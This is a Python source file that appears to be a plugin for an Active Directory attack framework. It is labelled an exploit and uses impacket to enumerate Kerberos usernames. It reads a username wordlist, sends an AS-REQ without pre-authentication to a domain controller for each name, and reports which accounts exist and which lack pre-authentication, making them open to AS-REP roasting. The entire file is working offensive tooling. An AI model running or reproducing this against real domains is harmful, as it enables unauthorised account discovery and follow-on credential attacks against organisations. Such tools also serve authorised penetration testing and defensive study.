import argparse
import datetime
import random
import socket
import struct
from binascii import hexlify
from copy import copy

from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.ccache import Principal
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from pyasn1.codec.der import decoder, encoder
from pyasn1.error import PyAsn1Error
from pyasn1.type.univ import noValue, Sequence
from pyasn1.type.useful import GeneralizedTime

from plugins.AD import PluginAdExploitBase
from utils import output
from utils.consts import AllPluginTypes


class PluginADKerberosUserEnum(PluginAdExploitBase):
    """
    kerberos 用户名枚举

    参数:
    :param: 域名
    :param: 用户名文件路径
    """

    display = "Kerberos 用户名枚举"
    alias = "kerb_ue"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display
        parser.add_argument("-D", "--domain", help="dc fqdn (dc01.test.lab)", required=True, dest="domain")
        parser.add_argument("--domain-ip", help="域名对应的IP", required=False, dest="domain_ip")
        parser.add_argument("--user-file", help="用户名字典路径", required=True, dest="user_file")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        output.debug(f"reading username wordlist: {args.user_file}")
        result = copy(self.result)

        en = EnumUsername(args.domain, args.domain_ip)

        pre_auth_value = ["否","是"]
        user_instance = list()

        # TODO 多线程
        with open(args.user_file, "r") as fil:
            for u in fil.readlines():
                s = en.enum(u.strip())

                if s != -1:
                    user_instance.append({
                        "用户名":u,
                        "不需要预身份验证":pre_auth_value[s]
                    })

        if len(user_instance):
            result["status"] = 1
            result["data"]["instance_list"] = user_instance
        else:
            result["status"] = 0

        return result


class EnumUsername:
    def __init__(self, domain: str, domain_ip):
        self.__domain_fqdn = domain
        self.__kdcIP = domain_ip

        self.__domain = ".".join(domain.split(".")[-2:]).upper()

    def enum(self, userName, requestPAC=True):

        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        asReq = AS_REQ()

        domain = self.__domain
        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = requestPAC
        encodedPacRequest = encoder.encode(pacRequest)

        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encodedPacRequest

        reqBody = seq_set(asReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        seq_set(reqBody, 'cname', clientName.components_to_asn1)

        if domain == '':
            raise Exception('Empty Domain not allowed in Kerberos')

        reqBody['realm'] = self.__domain

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['rtime'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(reqBody, 'etype', supportedCiphers)

        message = encoder.encode(asReq)

        try:
            r = sendReceive(message, self.__domain_fqdn, self.__kdcIP)
            as_rep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
            output.success(f"Get username: {userName}")
            output.debug(f"{'':<4}response code: {as_rep['error-code']}")

            return 0

        except KerberosError as e:  # username not found
            # output.debug(f"{userName} not found. error code: {e.packet['error-code']}")

            return -1
        except PyAsn1Error as e:  # Do not require Kerberos pre-identification
            output.debug(f"Get username: {output.YELLOW}{userName}{output.RESET}"
                         f" <-- This Account don't require kerberos pre-identification")

            return 1


def sendReceive(data, host, kdcHost):
    if kdcHost is None:
        targetHost = host
    else:
        targetHost = kdcHost

    messageLen = struct.pack('!i', len(data))

    # output.debug('Trying to connect to KDC at %s' % targetHost)
    try:
        af, socktype, proto, canonname, sa = socket.getaddrinfo(targetHost, 88, 0, socket.SOCK_STREAM)[0]
        s = socket.socket(af, socktype, proto)
        s.connect(sa)
    except socket.error as e:
        raise socket.error("Connection error (%s:%s)" % (targetHost, 88), e)

    s.sendall(messageLen + data)

    recvDataLen = struct.unpack('!i', s.recv(4))[0]

    r = s.recv(recvDataLen)
    while len(r) < recvDataLen:
        r += s.recv(recvDataLen - len(r))

    try:
        krbError = KerberosError(packet=decoder.decode(r, asn1Spec=KRB_ERROR())[0])
    except:
        return r

    if krbError.getErrorCode() != constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
        try:
            for i in decoder.decode(r):
                if type(i) == Sequence:
                    for k in vars(i)["_componentValues"]:
                        if type(k) == GeneralizedTime:
                            server_time = datetime.datetime.strptime(k.asOctets().decode("utf-8"), "%Y%m%d%H%M%SZ")
                            # output.debug("Server time (UTC): %s" % server_time)
        except:
            # Couldn't get server time for some reason
            pass
        raise krbError

    return r
